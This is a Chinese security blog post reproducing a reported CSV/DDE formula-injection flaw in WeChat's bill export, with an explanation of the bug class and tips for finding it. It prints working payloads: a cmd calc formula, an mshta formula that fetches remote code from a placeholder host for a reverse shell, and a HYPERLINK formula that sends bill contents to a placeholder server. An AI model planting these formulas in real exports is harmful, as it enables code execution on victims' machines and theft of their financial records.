---
title: 如何复现网传微信csv注入漏洞？
url: https://www.secpulse.com/archives/200060.html
source: 安全脉搏
date: 2023-05-10
fetch_date: 2025-10-04T11:37:43.739427
---

# 如何复现网传微信csv注入漏洞？

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 如何复现网传微信csv注入漏洞？

[漏洞复现](https://www.secpulse.com/archives/category/articles/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0)

[公众号:安全女巫](https://www.secpulse.com/newpage/author?author_id=49672)

2023-05-09

11,374

**********如果你喜欢我的文章，欢迎关注公众号：安全女巫
转载请注明出处：https://mp.weixin.qq.com/s/gdmnUJN1l\_nxmQUUXFLmtQ**********

**前言**

网传微信csv注入漏洞，该漏洞问题出在交易对方账号名称+商品+备注三处字段。微信在导出账单时，将名称写入字段没有进行处理导致。攻击者使用= ，- ，+，等符号，开启DDE公式，即可触发命令执行。

**该漏洞强加给微信实属这个锅背的有点冤，加上这种漏洞h1貌似二年前已经不收了。**

**漏洞具体位置**

点击钱包--账单--常见问题--下载账单

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200060-1683598772.png)

**漏洞简介**

CSV 注入（CSV Injection）漏洞通常出现在具有导出文件 (.csv/.xls) 功能的网站中。当导出的文件内容可控时，攻击者通常会将恶意负载（公式）注入到输入字段中。当用户导出并打开文件时，EXCEL 会调用其自身的动态功能以执行攻击者的恶意代码，从而控制用户的计算机。

DDE 是 Windows 操作系统下的进程间通信协议，通过一种动态数据交换机制实现。使用 DDE 通信需要两个 Windows 应用程序，其中一个作为服务器处理信息，另一个作为客户机从服务器获得信息。

DDE 支持 Microsoft Excel、LibreOffice 和 Apache OpenOffice 等软件，可以在 Excel、Word、Rtf、Outlook 等应用中使用该机制来根据外部应用的处理结果来更新内容。

因此，如果我们制作包含 DDE 公式的 CSV 文件，Excel 在打开该文件时就会尝试执行外部应用程序。

调用 DDE 需要在文件->选项->信任中心->信任中心设置->外部内容中开启：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200060-1683598773.png)

漏洞的详细介绍可参考：

https://owasp.org/www-community/attacks/CSV\_Injection

https://www.notsosecure.com/data-exfiltration-formula-injection/

**相关漏洞**

**Twitter**

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200060-1683598774.png)

**漏洞复现**

**点击钱包--账单--常见问题--下载账单**

**提前将****别人****名字，或者交易备注加入攻击代码。**

**[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/image2.png "image2.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/image2.png)**![]()按上节内容开启DDE

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/image3-1024x173.png "image3-1024x173.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/image3.png)

下载结果

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200060-1683598775.png)

Payload

```
  =1+cmd|' /C calc'!A01
```

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/image4-1024x149.png "image4-1024x149.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/image4.png)
执行calc
[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/image5-1024x581.png "image5-1024x581.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/image5.png)![]()

尝试使用mshta.exe来执行位于"http://xx.xxx"的恶意代码。

在限制长度的地方使用短域名，长度是够的，哪怕是对方账户名字。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200060-1683598776.png)

在域名里面加入自己的攻击载荷。

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/image6-1024x100.png "image6-1024x100.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/image6.png)![]()

```
=mshta|'http:\xx.xx1'!A0
```

利用Metasploit能够生成payload，可使用下面的注入执行payload，从而达到反弹shell的目的。

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/image7-1024x144.png "image7-1024x144.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/image7.png)![]()

远程服务器接受到mshta请求

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/image8-1024x556.png "image8-1024x556.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/image8.png)![]()

利用表达式窃取表格内容获取账单详情

经过在CSV文件中注入超连接函数，当用户打开文件并点击连接时，能够把指定的单元格内容提交到指定网址（以下提交A2/A3单元格的内容）。

打印出账单表格内容

```
=HYPERLINK("http:\xx.xxi="&C27&C28,1)
```

 将会表格内容转账账号名字发送到dns服务器

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/image9-1024x529.png "image9-1024x529.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/image9.png)

**漏洞挖掘思路**

要点：

* 确认系统是否有导出为 csv 或 xls 表格的功能，一般存在于信息统计、日志导出等功能处。
* 确认导出的内容是否用户可控：可以在界面直接编辑/新增，或通过数据篡改、HPP、追踪数据源等方式控制输入。
* 写入测试脚本=1+1，导出后查看表格内容是否解析。
* 尝试绕过存在的过滤。

  **总结**

  本文复现了微信CSV Injection漏洞，并普及了一些关于csv注入相关利用方式。总而言之，csv injection 在钓鱼的场景中目前确实没有什么价值。

**本文作者：[公众号:安全女巫](newpage/author?author_id=49672)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/200060.html**](https://www.secpulse.com/archives/200060.html)

Tags: [CSV Injection](https://www.secpulse.com/archives/tag/csv-injection)、[CSV 注入](https://www.secpulse.com/archives/tag/csv-%E6%B3%A8%E5%85%A5)、[csv注入漏洞](https://www.secpulse.com/archives/tag/csv%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E)、[DDE](https://www.secpulse.com/archives/tag/dde)、[metasploit](https://www.secpulse.com/archives/tag/metasploit)、[twitter](https://www.secpulse.com/archives/tag/twitter)、[微信](https://www.secpulse.com/archives/tag/%E5%BE%AE%E4%BF%A1)

点赞：
4
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![WECHAT二维码闪退分析](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/04/1683184162259-300x201.png)

  WECHAT二维码闪退分析](https://www.secpulse.com/archives/199777.html "详细阅读 WECHAT二维码闪退分析")
* [![钓鱼场景下微信聊天记录回传](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/04/1682058454144-300x209.png)

  钓鱼场景下微信聊天记录回传](https://www.secpulse.com/archives/199362.html "详细阅读 钓鱼场景下微信聊天记录回传")
* [![【完结篇】微信泄露手机号事件的回顾与总结](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/04/1681267657883-300x174.png)

  【完结篇】微信泄露手机号事件的回顾与总结](https://www.secpulse.com/archives/198849.html "详细阅读 【完结篇】微信泄露手机号事件的回顾与总结")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![](...